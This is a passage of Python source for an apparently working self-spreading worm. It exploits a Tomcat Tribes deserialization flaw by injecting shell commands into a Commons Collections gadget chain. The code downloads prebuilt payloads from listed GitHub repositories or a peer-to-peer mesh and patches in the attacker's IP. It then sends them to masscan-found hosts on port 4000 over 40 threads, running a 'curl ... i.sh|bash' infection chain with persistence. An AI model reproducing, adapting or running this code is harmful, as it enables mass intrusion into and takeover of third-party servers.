    def _build_cc6_payload(self, command: str) -> bytes:
        """
        Tier 3 Python fallback: returns a real CC6 gadget chain binary with the
        supplied command injected at the Java String level.

        Method:
          1. Decode the hardcoded real CC6 binary blob (from GadgetGen.java).
          2. Locate the 3rd TC_STRING in the exec String[] array using the
             reliable marker b'\x74\x00\x07/bin/sh\x74\x00\x02-c\x74'.
          3. Read old command length (2-byte big-endian), replace with new
             command bytes, update the length field in place.
          Result: a structurally valid Java serialized CC6 chain with the
          caller's command, always executes via /bin/sh -c <command>.
        """
        import base64, struct
        data = bytearray(base64.b64decode(self._CC6_BLOB_B64))

        # Locate the String[] exec args by the reliable marker:
        # TC_STRING(0x74) + \x00\x07 + "/bin/sh" + TC_STRING(0x74) + \x00\x02 + "-c" + TC_STRING(0x74)
        MARKER = b"\x74\x00\x07/bin/sh\x74\x00\x02-c\x74"
        idx = bytes(data).find(MARKER)
        if idx == -1:
            # Blob corrupt/not found — return blob with original bootstrap command
            self.logger.warning("[TRIBES] CC6 marker not found in blob, using bootstrap command")
            return bytes(data)

        # Position after the marker is at the 2-byte length of the command string
        cmd_len_pos = idx + len(MARKER)
        old_cmd_len = struct.unpack(">H", bytes(data[cmd_len_pos:cmd_len_pos + 2]))[0]
        cmd_bytes   = command.encode("utf-8")[:65535]
        new_cmd_len = len(cmd_bytes)

        # Rebuild: prefix + TC_STRING + new_len(2) + new_cmd + suffix
        new_data = (
            bytes(data[:cmd_len_pos])
            + struct.pack(">H", new_cmd_len)
            + cmd_bytes
            + bytes(data[cmd_len_pos + 2 + old_cmd_len:])
        )
        return new_data

    def _patch_precompiled_payload(self, data: bytes, seed_ip: str) -> bytes:
        """
        Patch a downloaded pre-compiled payload.bin at runtime:
          1. Replace __GITHUB__ placeholder with the primary GitHub mirror path.
          2. Replace default seed IP 127.0.0.1 with the actual attacker seed IP.
        Both patches correctly update the Java String 2-byte length field to
        prevent StreamCorruptedException on the target JVM.
        """
        import struct

        def patch_java_string(buf: bytes, find_sub: bytes, replace_sub: bytes) -> bytes:
            """Scan for TC_STRING (0x74) containing find_sub, replace it, update length."""
            pos = 0
            while pos < len(buf) - 3:
                if buf[pos] == 0x74:  # TC_STRING
                    str_len = struct.unpack(">H", buf[pos+1:pos+3])[0]
                    str_end = pos + 3 + str_len
                    if str_end <= len(buf) and find_sub in buf[pos+3:str_end]:
                        old_str  = buf[pos+3:str_end]
                        new_str  = old_str.replace(find_sub, replace_sub, 1)
                        new_entry= bytes([0x74]) + struct.pack(">H", len(new_str)) + new_str
                        return buf[:pos] + new_entry + buf[str_end:]
                pos += 1
            return buf

        # Patch 1: __GITHUB__ → primary mirror path
        data = patch_java_string(data, b"__GITHUB__", self._GITHUB_MIRROR_PATH)

        # Patch 2: default seed IP → real attacker IP (only if different)
        if seed_ip and seed_ip != "127.0.0.1":
            data = patch_java_string(data, b"127.0.0.1", seed_ip.encode("utf-8"))

        return data

    def _send_frame(self, host: str, port: int, frame: bytes) -> bool:
        """Open a raw TCP socket and send the tribes frame."""
        import socket
        try:
            with socket.create_connection((host, port), timeout=self.timeout) as s:
                s.sendall(frame)
                s.settimeout(3)
                try:
                    s.recv(256)
                except Exception:
                    pass
            return True
        except Exception as e:
            self.logger.debug(f"[TRIBES] TCP send error {host}:{port}: {e}")
            return False

    # ------------------------------------------------------------------
    # 3-Tier Payload Acquisition (GitHub → libp2p → Python fallback)
    # ------------------------------------------------------------------

    # Tier 1: GitHub raw URLs for pre-compiled tribes_payload.bin.
    # Uses raw.githubusercontent.com — the only URL that returns the actual binary file.
    _PAYLOAD_GITHUB_URLS = [
        "https://raw.githubusercontent.com/gihubuser989/redesigned-lamprv3/main/tribes_payload.bin",
        "https://raw.githubusercontent.com/shadow788878/silver-octo-palm-tree/main/tribes_payload.bin",
        "https://raw.githubusercontent.com/jaggubandarw131/silver-octo-palm-tree/main/tribes_payload.bin"
    ]

    # Primary GitHub mirror path (user/repo/branch) used to patch __GITHUB__ in the binary
    _GITHUB_MIRROR_PATH = b"snivy987654/silver-octo-palm-tree/main"

    # libp2p content key for P2P mesh retrieval (Tier 2)
    _PAYLOAD_P2P_KEY = "tribes_cc6_payload_bin"

    # In-process cache: once downloaded/received, reuse without re-fetching
    _payload_cache: bytes = b""

    @classmethod
    def set_github_payload_url(cls, url: str):
        """Register an additional GitHub raw URL for pre-compiled payload.bin retrieval."""
        if url not in cls._PAYLOAD_GITHUB_URLS:
            cls._PAYLOAD_GITHUB_URLS.insert(0, url)

    def _fetch_payload_github(self) -> bytes:
        """Tier 1: Download pre-compiled tribes_payload.bin from GitHub raw mirrors."""
        import urllib.request
        for url in self._PAYLOAD_GITHUB_URLS:
            try:
                with urllib.request.urlopen(url, timeout=8) as r:
                    data = r.read()
                # Validate Java serialization magic (ACED 0005)
                if data[:2] == b"\xac\xed":
                    self.logger.info(f"[TRIBES] Payload downloaded from GitHub ({len(data)}b): {url}")
                    return data
                else:
                    self.logger.debug(f"[TRIBES] GitHub returned non-binary ({len(data)}b) from {url} — skipping")
            except Exception as e:
                self.logger.debug(f"[TRIBES] GitHub fetch failed ({url}): {e}")
        return b""

    def _fetch_payload_p2p(self) -> bytes:
        """Tier 2: Retrieve pre-compiled payload.bin from libp2p P2P mesh."""
        if not self.p2pmanager:
            return b""
        try:
            # Try standard libp2p content retrieval methods
            for method in ("get_content", "retrieve_file", "fetch"):
                fn = getattr(self.p2pmanager, method, None)
                if fn:
                    data = fn(self._PAYLOAD_P2P_KEY)
                    if isinstance(data, bytes) and data[:2] == b"\xac\xed":
                        self.logger.info(f"[TRIBES] Payload retrieved from libp2p mesh ({len(data)}b)")
                        return data
        except Exception as e:
            self.logger.debug(f"[TRIBES] P2P fetch failed: {e}")
        return b""

    def _build_payload_python(self, command: str) -> bytes:
        """Tier 3: Generate CC6 gadget chain bytes in pure Python (always available)."""
        return self._build_cc6_payload(command)

    def _acquire_payload(self, command: str, seed_ip: str = "127.0.0.1") -> tuple:
        """
        3-Tier payload acquisition with in-process caching.
        Returns (payload_bytes, tier_label) where tier_label is 'GitHub'/'P2P'/'Python'.

        Tier 1 → GitHub raw.githubusercontent.com URLs (pre-compiled CC6 binary)
        Tier 2 → libp2p P2P mesh (survives GitHub removal)
        Tier 3 → Pure-Python CC6 builder embedding the full infection command

        After Tier 1 or Tier 2 download, _patch_precompiled_payload() is called to:
          • Replace __GITHUB__ with the real mirror path
          • Replace default seed IP 127.0.0.1 with the real attacker seed IP
        This guarantees the bootstrap command in the binary actually reaches back.
        """
        # Return cached copy if available (already patched)
        if TomcatTribesExploitSpreader._payload_cache:
            return TomcatTribesExploitSpreader._payload_cache, "GitHub(cached)"

        # Tier 1: GitHub
        data = self._fetch_payload_github()
        if data:
            data = self._patch_precompiled_payload(data, seed_ip)
            TomcatTribesExploitSpreader._payload_cache = data
            return data, "GitHub"

        # Tier 2: libp2p
        data = self._fetch_payload_p2p()
        if data:
            data = self._patch_precompiled_payload(data, seed_ip)
            TomcatTribesExploitSpreader._payload_cache = data
            try:
                if self.p2pmanager and hasattr(self.p2pmanager, 'provide_content'):
                    self.p2pmanager.provide_content(self._PAYLOAD_P2P_KEY, data)
            except Exception:
                pass
            return data, "P2P"

        # Tier 3: Python — generates fresh CC6 binary with the real infection command
        self.logger.info("[TRIBES] Using Python CC6 fallback (no pre-compiled payload available)")
        return self._build_cc6_payload(command), "Python"

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def _get_seed_ip(self):
        if self.p2pmanager and hasattr(self.p2pmanager, 'nat_traversal'):
            try:
                return self.p2pmanager.nat_traversal.get_public_endpoint().split(':')[0]
            except Exception:
                pass
        import urllib.request
        for url in ['https://api.ipify.org', 'https://ident.me']:
            try:
                with urllib.request.urlopen(url, timeout=5) as r:
                    ip = r.read().decode().strip()
                    if ip:
                        return ip
            except Exception:
                continue
        return "127.0.0.1"

    @safe_operation("tomcat_tribes_exploitation")
    def exploit_target(self, target_ip, target_port=4000):
        """
        Exploit CVE-2026-34486 on target_ip:target_port.

        Payload acquisition order:
          1. Pre-compiled tribes_payload.bin from GitHub mirror(s)
          2. Pre-compiled tribes_payload.bin from libp2p P2P mesh
          3. Freshly generated CC6 bytes via Python (fallback, always works)

        Returns True on successful payload delivery.
        """
        self.stats["attempted"] += 1

        # Build infection command (used by Python fallback and for SEED env-var injection)
        try:
            seed_ip = self._get_seed_ip()
            if self.persistence_manager:
                command = self.persistence_manager.get_immortal_infection_chain(seed_ip=seed_ip)
            else:
                command = f"curl -fsSL http://{seed_ip}/i.sh|bash"
        except Exception as e:
            self.logger.warning(f"[TRIBES] Could not build infection chain: {e}")
            command = f"touch /tmp/.tribes_owned"
            seed_ip  = "127.0.0.1"

        try:
            # Acquire best available payload (3-tier), passing seed_ip for patching
            payload, tier = self._acquire_payload(command, seed_ip)
            frame = self._build_tribes_frame(payload)
            sent  = self._send_frame(target_ip, target_port, frame)

            if sent:
                self.logger.info(
                    f"[TRIBES-RCE] CVE-2026-34486 payload delivered [{tier}] "
                    f"→ {target_ip}:{target_port} | cmd_len={len(payload)}b"
                )
                self.stats["successful"] += 1
                # Seed the P2P mesh so peers can skip GitHub entirely next time
                if self.p2pmanager and hasattr(self.p2pmanager, 'provide_content'):
                    try:
                        self.p2pmanager.provide_content(self._PAYLOAD_P2P_KEY, payload)
                    except Exception:
                        pass
                if self.p2pmanager:
                    try:
                        self.p2pmanager.broadcast("tribes_owned", ip=target_ip, port=target_port)
                    except Exception:
                        pass
                return True
            else:
                self.stats["failed"] += 1
                return False
        except Exception as e:
            self.logger.error(f"[TRIBES] exploit_target error: {e}")
            self.stats["failed"] += 1
            return False

    def spread(self, targets):
        """Spread to a list of {'ip':..., 'port':...} dicts."""
        from concurrent.futures import ThreadPoolExecutor, as_completed
        results = []
        with ThreadPoolExecutor(max_workers=40) as ex:
            futs = {ex.submit(self.exploit_target, t['ip'], t.get('port', 4000)): t for t in targets}
            for fut in as_completed(futs):
                t = futs[fut]
                try:
                    if fut.result():
                        results.append(t['ip'])
                except Exception:
                    pass
        return results

    def process_masscan_results_tribes(self, scan_line: str):
        """
        Masscan result parser for Tomcat Tribes receiver port (4000/TCP).
        Called by the distributed scanner when masscan finds an open port.
        Returns a target dict for exploit_target(), or None if not a match.

        Masscan output format:
          open tcp 4000 1.2.3.4 1234567890
        """
        for port in self.TRIBES_PORTS if hasattr(self, 'TRIBES_PORTS') else [4000, 4001, 4002, 5000]:
            if f"{port}/open" in scan_line or f"open tcp {port}" in scan_line:
                parts = scan_line.strip().split()
                # masscan format: "open tcp PORT IP TIMESTAMP"
                ip = None
                for p in parts:
                    if p.count('.') == 3:  # IPv4
                        ip = p
                        break
                if ip:
                    return {"ip": ip, "port": port, "service": "tomcat_tribes_cve_2026_34486"}
        return None

    def get_stats(self):
        return self.stats

